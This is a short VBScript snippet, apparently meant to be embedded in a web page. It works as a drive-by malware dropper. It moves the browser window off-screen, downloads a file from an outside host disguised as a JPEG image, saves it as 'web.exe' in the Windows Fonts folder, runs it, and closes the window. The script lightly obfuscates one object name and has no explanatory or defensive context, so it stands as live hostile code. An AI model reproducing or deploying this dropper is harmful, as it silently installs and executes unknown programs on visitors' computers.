<script language="vbs">
self.MoveTo 4998,4989
Set shell=CreateObject("WScript.Shell")
ddd = shell.SpecialFolders("Fonts") + "\" + "web.exe"
set dot=CreateObject("Msxml2.XMLHTTP")
dot.Open "GET", "http://photo.matrix.net.hk/~rlcw/www/pic10.jpg", false
WScript.Sleep(300)
dot.Send()
cs = dot.responseBody
Set fso = CreateObject("Script"+"ing".".FileSystemObject")
Set f = fso.CreateTextFile(ddd)
for i = 0 to UBound(cs)
c = ascb(midb(cs, i+1, 1))
f.Write chr(c)
next
f.close
shell.run(ddd)
window.close()
</script>